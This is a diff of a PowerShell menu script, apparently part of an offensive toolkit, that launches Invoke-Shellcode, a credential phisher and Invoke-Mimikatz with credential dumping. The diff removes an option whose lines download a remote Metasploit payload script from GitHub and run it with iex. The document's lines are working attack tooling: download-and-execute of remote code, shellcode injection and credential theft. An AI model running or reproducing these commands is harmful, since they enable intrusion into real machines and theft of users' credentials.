@@ -24,7 +24,6 @@ function PowerTools
     Write-Host "2: Invoke-Shellcode"
     Write-Host "3: Invoke-CredentialPhisher"
     Write-Host "4: Invoke-Mimikatz"
-    Write-Host "5: Invoke-Msf5Aes256Payload"
     Write-Host "99: Exit"
     Write-Host ""
 
@@ -64,10 +63,6 @@ function PowerTools
 				    $mimikatz = $True
                             }
 			    Handle-Mimikatz
-                  }
-                5 {
-                            iex((New-Object system.net.WebClient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Scripts/Invoke-Msf5Aes256Payload.ps1')) 
-                            Handle-Msf5Aes256Payload
                   }
                 99{
                             return 
@@ -125,12 +120,6 @@ function Handle-Mimikatz {
                             Invoke-Mimikatz -DumpCreds
           }
    }   
-}
-
-function Handle-Msf5Aes256Payload {
-   Write-host "" 
-   $arch = Read-Host -Prompt '(Invoke-Msf5Aes256Payload) arch'
-   Invoke-Msf5Aes256Payload -arch $arch 
 }
 
 PowerTools
